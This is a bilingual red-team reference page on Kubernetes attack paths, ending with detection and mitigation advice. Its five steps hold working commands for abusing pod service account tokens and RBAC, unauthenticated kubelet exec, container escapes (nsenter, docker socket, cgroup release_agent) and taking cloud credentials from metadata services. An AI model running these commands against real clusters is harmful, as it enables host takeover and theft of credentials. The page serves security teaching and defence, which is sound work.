---
id: kubernetes-attack-paths
title_en: Kubernetes Attack Paths
title_zh: Kubernetes 攻击路径
summary_en: A shell in a pod is rarely the goal, it is the doorway. The cluster API answers questions your credentials may allow, RBAC is full of permissions nobody intended to grant, and a privileged pod or a mounted socket is the host.
summary_zh: 拿到 pod 里的 shell 通常不是终点，而是门。集群 API 会回答你的凭据允许它回答的问题，RBAC 里塞满了没人打算授出的权限，而一个特权 pod 或挂进去的 socket 就等于宿主机。
tags: [kubernetes, cloud, container, rbac, privilege-escalation, red-team]
tools: [kubectl, kube-hunter, peirates, amicontained, curl]
attck: [T1610, T1611]
platform: [kubernetes, linux, cloud]
difficulty: advanced
updated: 2026-10-08
---

<!-- lang:en -->
### What you actually have

The moment you have code execution inside a pod, three things are usually within reach:

1. A **service account token** mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`.
2. The **cluster API** at `https://kubernetes.default.svc`, reachable from inside.
3. Whatever the pod was given — volumes, host mounts, a docker socket, extra capabilities.

The token is the interesting one. Everything that follows is the question of what that token can do, and whether you can escalate from it to something that runs on the host.

### Step 1 — Find out who you are

```bash
# the standard mount
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API=https://kubernetes.default.svc

# what can this identity do?
curl -sk -H "Authorization: Bearer $TOKEN" $API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H 'Content-Type: application/json' \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'$NS'"}}'
```

With `kubectl` present (or copied in), it is one command:

```bash
kubectl auth can-i --list
kubectl auth can-i --list --namespace kube-system
```

Also check the environment and the mount table before anything else:

```bash
env | grep -i -E 'kube|aws|gcp|azure|token'
mount | grep -E 'host|docker|proc'
ls -la /var/run/docker.sock /var/run/secrets 2>/dev/null
```

`amicontained` answers "what am I allowed to do in this container" concisely: capabilities, seccomp, AppArmor, namespace mode.

### Step 2 — RBAC permissions worth escalating with

| Permission | What it gives you |
|---|---|
| `get`/`list` **secrets** | Every credential stored in the namespace, including other service accounts' tokens |
| `create` **pods** | A pod of your own design: privileged, host mounts, any service account |
| `create` **pods/exec** | A shell in a pod that already has the access you want |
| `create` **pods/portforward** | Reach anything the target pod can reach |
| `get` **nodes/proxy** | The kubelet API (port 10250) — often unauthenticated, always powerful |
| `create` **clusterrolebindings** / **rolebindings** | Bind `cluster-admin` to yourself |
| `escalate` / `bind` on roles | Grant yourself permissions you do not otherwise have |
| `update`/`patch` **roles** | Add the permission you want to a role you already hold |
| `impersonate` | Become another user, group or service account |
| `create` **serviceaccounts/token** | Mint a token for a more interesting service account |
| `get` **cronjobs** / **daemonsets** | Find an existing workload that runs as something better |

The classic chain is three steps long:

```bash
# 1. read a more privileged token out of a secret
kubectl get secrets -o json | jq '.items[] | select(.type=="kubernetes.io/service-account-token")'
# 2. create a pod that mounts it
kubectl run pwn --image=alpine --overrides='{"spec":{"serviceAccountName":"admin-sa"}}' -it -- sh
# 3. or exec straight into something that already has it
kubectl exec -it deploy/web -- sh
```

`kubectl` with `--as` is worth trying when you have impersonate rights:

```bash
kubectl --as=system:admin --as-group=system:masters get secrets -A
```

### Step 3 — The kubelet, where authentication goes missing

The kubelet on every node exposes an API on **10250** (and a read-only one on 10255 historically). Its authorization mode is sometimes `AlwaysAllow`, and its certificate check may accept anonymous requests:

```bash
curl -sk https://NODE_IP:10250/pods | jq .
curl -sk https://NODE_IP:10250/run/<namespace>/<pod>/<container> -d 'cmd=id'
curl -sk https://NODE_IP:10250/metrics
```

If `get nodes/proxy` is in your rules you can reach the same API through the cluster API, which means no direct network access to the node is needed:

```bash
kubectl get --raw "/api/v1/nodes/NODE/proxy/pods"
kubectl get --raw "/api/v1/nodes/NODE/proxy/run/ns/pod/container?cmd=id"
```

A kubelet that answers unauthenticated is a full compromise of that node: you can exec in every pod on it.

### Step 4 — From pod to host

| Configuration | Escape |
|---|---|
| `privileged: true` | Mount the host filesystem, load kernel modules, `nsenter` into host namespaces |
| `hostPID: true` | `nsenter -t 1 -m -u -i -n -p -- sh` for a host root shell |
| `hostPath: /` volume | Read and write the host filesystem directly |
| `hostPath: /var/run/docker.sock` | `docker run -v /:/host --privileged` on the host daemon |
| `CAP_SYS_ADMIN` | cgroup `release_agent`, mounts |
| `CAP_SYS_PTRACE` | Inject into any process on the host when combined with hostPID |
| Writable `/proc/sys/kernel/core_pattern` | Command execution as the host's core dump handler |

```bash
# privileged, host PID: the shortcut
nsenter -t 1 -m -u -i -n -p -- sh

# docker socket mounted: run a container with the host root mounted
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh

# cgroup release_agent (older kernels, CAP_SYS_ADMIN)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "/bin/sh -c 'id > /host-tmp/pwned'" > /tmp/cgrp/release_agent
```

`kube-hunter` and `peirates` automate the discovery of these paths once you have a starting point:

```bash
kube-hunter --remote NODE_IP          # from outside
kube-hunter --pod                     # from inside a pod
peirates                               # interactive, once you have a token
```

### Step 5 — Cloud identity, the real prize

In managed clusters the pod's service account is often federated to the cloud provider, which turns a Kubernetes foothold into cloud credentials:

- **EKS (IRSA).** `AWS_ROLE_ARN` and `AWS_WEB_IDENTITY_TOKEN_FILE` in the environment; exchange the projected token via `sts:AssumeRoleWithWebIdentity`:
  ```bash
  aws sts assume-role-with-web-identity --role-arn "$AWS_ROLE_ARN" \
    --role-session-name x --web-identity-token "$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)"
  ```
- **GKE (Workload Identity).** The metadata server hands out a token for the bound Google service account:
  ```bash
  curl -H 'Metadata-Flavor: Google' \
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
  ```
- **AKS.** Workload identity uses a federated credential the same way; the IMDS endpoint on `169.254.169.254` is the path.

Check the role's permissions before assuming it is interesting — a node role is frequently far more powerful than the workload role.

### Detection

- **Kubernetes audit logs** are the primary source. Alert on: `create pods/exec`, `create pods` with a privileged or hostPath spec, `create clusterrolebindings`, `impersonate`, `get secrets` in bulk, and any request to `nodes/proxy`.
- Service account token use from outside the cluster (the token has an audience and an issuer; unusual source IPs are visible).
- New pods in `kube-system` or with suspicious images.
- CloudTrail/Cloud Audit Logs for `AssumeRoleWithWebIdentity` from an unexpected role session name or IP.

### Mitigation

- **Least privilege RBAC**, reviewed as code. `cluster-admin` should be for almost nothing; wildcard verbs and resources are a finding on their own.
- **Disable `automountServiceAccountToken`** where the workload does not need it, and keep tokens short-lived and audience-scoped (projected tokens, not legacy long-lived secrets).
- **Pod Security Standards** (restricted) at the namespace level: no privileged, no hostPath, no host namespaces, drop capabilities.
- **Require kubelet authentication and authorization** (`--anonymous-auth=false`, `--authorization-mode=Webhook`), and keep 10250 off any network an attacker can reach.
- **Never mount the container runtime socket into a workload.**
- **Network policies** so a compromised pod cannot reach the API server or other namespaces by default.
- **Separate clusters or accounts per trust level**, and make IRSA/Workload Identity roles as narrow as the RBAC they sit next to.

<!-- lang:zh -->
### 你手里到底有什么

一旦你在 pod 里能执行代码，通常有三样东西触手可及：

1. 挂在 `/var/run/secrets/kubernetes.io/serviceaccount/token` 的**服务账户令牌**。
2. 从容器内部可达的**集群 API**：`https://kubernetes.default.svc`。
3. 这个 pod 分到的一切 —— 卷、宿主机挂载、docker socket、额外 capabilities。

令牌是最有意思的那一样。后面所有事情都归结为一个问题：这个令牌能做什么，以及你能不能从它升到在宿主机上执行。

### 第一步 —— 先搞清楚你是谁

```bash
# 标准挂载点
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API=https://kubernetes.default.svc

# 这个身份能干什么？
curl -sk -H "Authorization: Bearer $TOKEN" $API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H 'Content-Type: application/json' \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'$NS'"}}'
```

如果容器里有 `kubectl`（或者你拷一个进去），一条命令就够：

```bash
kubectl auth can-i --list
kubectl auth can-i --list --namespace kube-system
```

在做别的之前，先看环境和挂载表：

```bash
env | grep -i -E 'kube|aws|gcp|azure|token'
mount | grep -E 'host|docker|proc'
ls -la /var/run/docker.sock /var/run/secrets 2>/dev/null
```

`amicontained` 能简明回答"我在这个容器里被允许做什么"：capabilities、seccomp、AppArmor、命名空间模式。

### 第二步 —— 值得用来提权的 RBAC 权限

| 权限 | 它给你什么 |
|---|---|
| `get`/`list` **secrets** | 命名空间里所有凭据，包括其他服务账户的令牌 |
| `create` **pods** | 一个你自己设计的 pod：特权、挂宿主机、指定任意服务账户 |
| `create` **pods/exec** | 进入一个已经拥有你想要权限的 pod |
| `create` **pods/portforward** | 打到目标 pod 能到达的任何地方 |
| `get` **nodes/proxy** | kubelet API（10250 端口）—— 常常未认证，且权限极大 |
| `create` **clusterrolebindings** / **rolebindings** | 把 `cluster-admin` 绑到自己身上 |
| 对 role 的 `escalate` / `bind` | 授出你自己本来没有的权限 |
| `update`/`patch` **roles** | 往你已持有的角色里加上你想要的权限 |
| `impersonate` | 变成另一个用户、组或服务账户 |
| `create` **serviceaccounts/token** | 为一个更有意思的服务账户签发令牌 |
| `get` **cronjobs** / **daemonsets** | 找到已经在以更高权限运行的现成工作负载 |

经典链条只有三步：

```bash
# 1. 从 secret 里读出一个更高权限的令牌
kubectl get secrets -o json | jq '.items[] | select(.type=="kubernetes.io/service-account-token")'
# 2. 起一个挂载它的 pod
kubectl run pwn --image=alpine --overrides='{"spec":{"serviceAccountName":"admin-sa"}}' -it -- sh
# 3. 或者直接 exec 进一个本来就有它的工作负载
kubectl exec -it deploy/web -- sh
```

有 impersonate 权限时，`--as` 值得一试：

```bash
kubectl --as=system:admin --as-group=system:masters get secrets -A
```

### 第三步 —— kubelet，认证缺失的重灾区

每个节点上的 kubelet 都在 **10250** 端口暴露 API（历史上 10255 还有个只读的）。它的授权模式有时是 `AlwaysAllow`，证书校验有时也接受匿名请求：

```bash
curl -sk https://NODE_IP:10250/pods | jq .
curl -sk https://NODE_IP:10250/run/<namespace>/<pod>/<container> -d 'cmd=id'
curl -sk https://NODE_IP:10250/metrics
```

如果你的规则里有 `get nodes/proxy`，你可以通过集群 API 到达同一个接口，也就是说根本不需要能直连节点网络：

```bash
kubectl get --raw "/api/v1/nodes/NODE/proxy/pods"
kubectl get --raw "/api/v1/nodes/NODE/proxy/run/ns/pod/container?cmd=id"
```

一个接受未认证请求的 kubelet 意味着那个节点彻底沦陷：你可以 exec 进它上面任何一个 pod。

### 第四步 —— 从 pod 到宿主机

| 配置 | 逃逸方式 |
|---|---|
| `privileged: true` | 挂载宿主机文件系统、加载内核模块、`nsenter` 进宿主机命名空间 |
| `hostPID: true` | `nsenter -t 1 -m -u -i -n -p -- sh` 拿到宿主机 root shell |
| `hostPath: /` 卷 | 直接读写宿主机文件系统 |
| `hostPath: /var/run/docker.sock` | 在宿主机守护进程上 `docker run -v /:/host --privileged` |
| `CAP_SYS_ADMIN` | cgroup `release_agent`、挂载 |
| `CAP_SYS_PTRACE` | 配合 hostPID 时注入宿主机上任意进程 |
| 可写的 `/proc/sys/kernel/core_pattern` | 以宿主机 core dump 处理器的身份执行命令 |

```bash
# 特权容器 + host PID：最快的捷径
nsenter -t 1 -m -u -i -n -p -- sh

# 挂了 docker socket：起一个把宿主机根挂进去的容器
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh

# cgroup release_agent（较老内核，需要 CAP_SYS_ADMIN）
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "/bin/sh -c 'id > /host-tmp/pwned'" > /tmp/cgrp/release_agent
```

有了起点之后，`kube-hunter` 和 `peirates` 能把这些路径的发现过程自动化：

```bash
kube-hunter --remote NODE_IP          # 从外部
kube-hunter --pod                     # 从 pod 内部
peirates                               # 拿到令牌后的交互式工具
```

### 第五步 —— 云身份，真正的猎物

在托管集群里，pod 的服务账户常常与云厂商做了联邦，于是一个 K8s 落脚点就变成了云凭据：

- **EKS（IRSA）。** 环境里有 `AWS_ROLE_ARN` 和 `AWS_WEB_IDENTITY_TOKEN_FILE`；用 `sts:AssumeRoleWithWebIdentity` 换取角色：
  ```bash
  aws sts assume-role-with-web-identity --role-arn "$AWS_ROLE_ARN" \
    --role-session-name x --web-identity-token "$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)"
  ```
- **GKE（Workload Identity）。** 元数据服务会为绑定的 Google 服务账户签发令牌：
  ```bash
  curl -H 'Metadata-Flavor: Google' \
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
  ```
- **AKS。** 工作负载身份同样走联邦凭据，路径是 `169.254.169.254` 上的 IMDS 端点。

先看角色权限再判断它值不值得，节点角色往往比工作负载角色强大得多。

### 检测

- **Kubernetes 审计日志**是首要来源。需要告警的：`create pods/exec`、带特权或 hostPath 规格的 `create pods`、`create clusterrolebindings`、`impersonate`、批量 `get secrets`，以及对 `nodes/proxy` 的任何请求。
- 服务账户令牌从集群外部被使用（令牌带 audience 和 issuer，异常来源 IP 是可见的）。
- `kube-system` 里出现新 pod，或者镜像可疑的 pod。
- CloudTrail / 云审计日志里出现来源可疑的 `AssumeRoleWithWebIdentity`（角色会话名或 IP 不符）。

### 缓解

- **RBAC 最小权限**，并且当代码来审。`cluster-admin` 几乎什么都不该给；通配符 verbs/resources 本身就是发现。
- **对不需要的工作负载关闭 `automountServiceAccountToken`**，令牌用短期、限定 audience 的投影令牌，不要用遗留的长期 secret。
- 命名空间级别启用 **Pod Security Standards（restricted）**：禁止特权、禁止 hostPath、禁止 host 命名空间、丢弃 capabilities。
- **强制 kubelet 认证与授权**（`--anonymous-auth=false`、`--authorization-mode=Webhook`），并把 10250 挡在攻击者能到达的网络之外。
- **绝不要把容器运行时 socket 挂进工作负载。**
- 配 **网络策略**，让被拿下的 pod 默认到不了 API server，也出不了自己的命名空间。
- **按信任级别拆分集群或账号**，并让 IRSA / Workload Identity 的角色窄到与其旁边的 RBAC 相匹配。
